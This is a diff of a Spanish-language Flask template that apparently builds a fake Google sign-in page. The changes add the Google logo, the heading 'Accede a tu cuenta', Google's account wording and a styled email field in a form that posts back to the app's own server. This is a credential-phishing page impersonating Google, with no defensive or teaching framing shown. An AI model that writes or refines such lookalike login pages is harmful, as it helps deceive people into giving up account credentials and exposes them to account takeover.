@@ -3,15 +3,20 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="{{url_for('static', filename='css/password.css') }}"> 
     <title>Accede a tu cuenta</title>
-    <h1>Usa tu Cuenta de Google. La cuenta se agregara a este dispocitivo y estara disponible para otras apps de Google </h1> 
+    
 </head>
 <body>
+  <img src="{{url_for('static', filename='images/Google_2015_logo.svg.png')}}" alt="logo" width="150" height="50">
+  <h1> Accede a tu cuenta </h1>
+  <h2>Usa tu Cuenta de Google. La cuenta se agregara a este dispocitivo y estara disponible para otras apps de Google </h2> 
     <a href="{{url_for('info')}}"> Mas informacion sobre el uso de tu cuenta </a>
       <form method="post">
         {{formu.hidden_tag()}}
-
+        <div class="campo">
         {{formu.email.label}} {{formu.email}}
+        </div>
         {{formu.submit}}
       </form>
 </body>
